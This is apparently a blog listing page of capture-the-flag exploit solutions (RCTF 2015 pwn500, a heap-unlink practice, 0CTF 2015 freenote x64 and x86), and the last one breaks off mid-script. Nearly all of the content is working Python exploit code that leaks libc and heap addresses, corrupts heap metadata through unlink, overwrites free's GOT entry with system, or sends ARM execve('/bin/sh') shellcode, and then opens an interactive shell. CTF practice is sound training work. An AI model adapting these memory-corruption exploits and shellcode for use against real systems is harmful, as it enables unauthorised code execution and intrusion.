      <a class="article-title" href="/2016/03/21/RCTF-2015-Quals-pwn500/">RCTF-2015-Quals-pwn500</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d">g27_9f47c9e9d3e7605f3bbdd4f92e51250d</a><br><a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb">g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb</a></p>
</blockquote>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line"># create socket</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line"><span class="built_in">io</span> = zio((host,port))</span><br><span class="line"></span><br><span class="line"># check ID</span><br><span class="line">check_id = <span class="string">'1'</span> * <span class="number">17</span> + <span class="string">'0'</span></span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Input your ID to check in:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(check_id)</span><br><span class="line"></span><br><span class="line"># enable cantin</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"3.CanTin\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Which carriage?\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"># read access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">"Bigtang"</span>)</span><br><span class="line"></span><br><span class="line"># leak access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'3'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"want?\n"</span>)</span><br><span class="line">hungry = <span class="number">-235</span></span><br><span class="line"><span class="built_in">io</span>.writeline(str(hungry))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"># open access code</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"choose:\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"3.CanTin\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Which carriage?\n"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">"Access code:"</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'\x58'</span>*<span class="number">0x32</span>)</span><br><span class="line"></span><br><span class="line"># shellcode = <span class="string">""</span></span><br><span class="line"># shellcode += <span class="string">"\x01\x60\x8f\xe2"</span> # add r6, pc, #<span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x16\xff\x2f\xe1"</span> # add bx r6</span><br><span class="line"># shellcode += <span class="string">"\x40\x40"</span> # eors r0, r0</span><br><span class="line"># shellcode += <span class="string">"\x78\x44"</span> # add r0, pc</span><br><span class="line"># shellcode += <span class="string">"\x0c\x30"</span> # adds r0, #<span class="number">12</span></span><br><span class="line"># shellcode += <span class="string">"\x49\x40"</span> # eors r1, r1</span><br><span class="line"># shellcode += <span class="string">"\x52\x40"</span> # eors r2, r2</span><br><span class="line"># shellcode += <span class="string">"\x0b\x27"</span> # movs r7, #<span class="number">11</span></span><br><span class="line"># shellcode += <span class="string">"\x01\xdf"</span> # svc <span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x01\x27"</span> # movs r7, #<span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x01\xdf"</span> # svc <span class="number">1</span></span><br><span class="line"># shellcode += <span class="string">"\x2f\x2f"</span> # .short <span class="number">0x2f2f</span></span><br><span class="line"># shellcode += <span class="string">"\x62\x69\x6e\x2f"</span> # .word <span class="number">0x2f6e6962</span></span><br><span class="line"># shellcode += <span class="string">"\x2f\x73"</span> # .short <span class="number">0x732f</span></span><br><span class="line"># shellcode += <span class="string">"\x68"</span> # .byte <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x01\x30\x8f\xe2"</span></span><br><span class="line">shellcode += <span class="string">"\x13\xff\x2f\xe1"</span></span><br><span class="line">shellcode += <span class="string">"\x78\x46\x08\x30"</span></span><br><span class="line">shellcode += <span class="string">"\x49\x1a\x92\x1a"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\x27\x01\xdf"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x2f\x73\x68"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(shellcode)</span><br><span class="line">#raw_input(<span class="string">"Debug"</span>)</span><br><span class="line">#<span class="built_in">io</span>.writeline(<span class="string">"whoami"</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Arm/">Arm</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Practice-2016-heap-unlink" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/26/Practice-2016-heap-unlink/" class="article-date">
  	<time datetime="2016-02-26T10:13:14.000Z" itemprop="datePublished">2016-02-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/26/Practice-2016-heap-unlink/">Practice-2016-heap-unlink</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/heap">heap</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = zio('./heap')</span></span><br><span class="line">io  = zio((<span class="string">'127.1'</span>,<span class="number">6666</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_chunk</span><span class="params">(length)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'1'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Input the size of chunk you want to add:'</span>)</span><br><span class="line">	io.writeline(str(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Set_chunk</span><span class="params">(index,data)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'2'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line">	io.read_until(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">	io.write(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'3'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Delete chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.writeline(<span class="string">'4'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Print chunk index:'</span>)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line">Add_chunk(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x8049d60</span></span><br><span class="line">fd  = ptr - <span class="number">0xc</span></span><br><span class="line">bk  = ptr - <span class="number">0x8</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x89</span>) + l32(fd) + l32(bk) + <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-4</span>*<span class="number">4</span>)</span><br><span class="line">payload += l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</span><br><span class="line">Set_chunk(<span class="number">0</span>, payload)</span><br><span class="line">Set_chunk(<span class="number">2</span>, <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\0'</span>))</span><br><span class="line">Delete_chunk(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x8049ce8</span></span><br><span class="line">payload  = l32(<span class="number">0</span>)*<span class="number">3</span> + l32(free_got)</span><br><span class="line">Set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">Print_chunk(<span class="number">0</span>)</span><br><span class="line">system = l32(io.read(<span class="number">4</span>)) - <span class="number">0xf75afc60</span> + <span class="number">0xf7579190</span></span><br><span class="line">Set_chunk(<span class="number">0</span>, l32(system))</span><br><span class="line"></span><br><span class="line">Delete_chunk(<span class="number">2</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x64" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x64/" class="article-date">
  	<time datetime="2015-12-11T17:43:59.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x64/">0CTF-2015-Quals-freenote-x64</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x64">freenote_x64</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"><span class="comment">#target = (host,port)</span></span><br><span class="line">target = <span class="string">'./freenote_x64'</span></span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">2333</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List_Note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New_Note</span><span class="params">(note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit_Note</span><span class="params">(num,note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(<span class="string">'Length of note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_Note</span><span class="params">(num)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([<span class="number">0x400b14</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">New_Note(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">New_Note(<span class="string">'e'</span>*<span class="number">0x8</span>)</span><br><span class="line">New_Note(<span class="string">'f'</span>*<span class="number">0x8</span>)</span><br><span class="line">List_Note()</span><br><span class="line">io.read_until(<span class="string">'e'</span>*<span class="number">0x8</span>)</span><br><span class="line">heap_base = l64(io.read_until(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">io.read_until(<span class="string">'f'</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_base = l64(io.read_until(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">Delete_Note(<span class="number">3</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x7fde9b68f4f0</span> - <span class="number">0x7fde9b9f1678</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x7fde9b7af160</span> - <span class="number">0x7fde9b9f1678</span></span><br><span class="line">heap = heap_base - <span class="number">0x1940</span></span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd = heap + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">3</span></span><br><span class="line">bk = heap + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">2</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l64(<span class="number">0</span>) + l64(<span class="number">0x81</span>)</span><br><span class="line">payload += l64(fd) + l64(bk)</span><br><span class="line">payload += <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-0x20</span>)</span><br><span class="line">payload += l64(<span class="number">0x80</span>) + l64(<span class="number">0x90</span>)</span><br><span class="line">payload += <span class="string">'B'</span>*<span class="number">0x80</span></span><br><span class="line">payload += l64(<span class="number">0</span>) + l64(<span class="number">0x91</span>)</span><br><span class="line"><span class="comment">#payload += 'C'*(0x20)</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload2  = <span class="string">''</span></span><br><span class="line">payload2 += l64(<span class="number">3</span>)</span><br><span class="line">payload2 += l64(<span class="number">1</span>) + l64(<span class="number">8</span>) + l64(bin_sh)</span><br><span class="line">payload2 += l64(<span class="number">1</span>) + l64(<span class="number">8</span>) + l64(free_got)</span><br><span class="line">payload2 += <span class="string">'C'</span>*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(<span class="number">0</span>,payload2)</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Edit_Note(<span class="number">1</span>,l64(system))</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x86" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x86/" class="article-date">
  	<time datetime="2015-12-11T17:43:40.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x86/">0CTF-2015-Quals-freenote-x86</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x86">freenote_x86</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line">target = (host,port)</span><br><span class="line"><span class="comment">#target = './freenote_x86'</span></span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=<span class="number">2333</span>)<span class="comment">#,print_read=NONE,print_write=NONE)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List_Note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New_Note</span><span class="params">(note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit_Note</span><span class="params">(num,note)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(<span class="string">'Length of note: '</span>)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete_Note</span><span class="params">(num)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number: '</span>)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.gdb_hint([0x08048860])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">New_Note(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">New_Note(<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">New_Note(<span class="string">'e'</span>*<span class="number">0x4</span>)</span><br><span class="line">New_Note(<span class="string">'f'</span>*<span class="number">0x4</span>)</span><br><span class="line">List_Note()</span><br><span class="line">io.read_until(<span class="string">'eeee'</span>)</span><br><span class="line">heap_base = l32(io.read(<span class="number">4</span>))</span><br><span class="line">io.read_until(<span class="string">'ffff'</span>)</span><br><span class="line">libc_base = l32(io.read(<span class="number">4</span>))</span><br><span class="line">Delete_Note(<span class="number">3</span>)</span><br><span class="line">Delete_Note(<span class="number">2</span>)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0xf759a360</span> - <span class="number">0xf7702450</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0xf76b91a9</span> - <span class="number">0xf7702450</span></span><br><span class="line">heap = heap_base - <span class="number">0xd28</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">List_Note()</span><br><span class="line"></span><br><span class="line">fd = heap + <span class="number">0x18</span> - <span class="number">0xc</span></span><br><span class="line">bk = heap + <span class="number">0x18</span> - <span class="number">0x8</span></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x81</span>)</span><br><span class="line">payload += l32(fd) 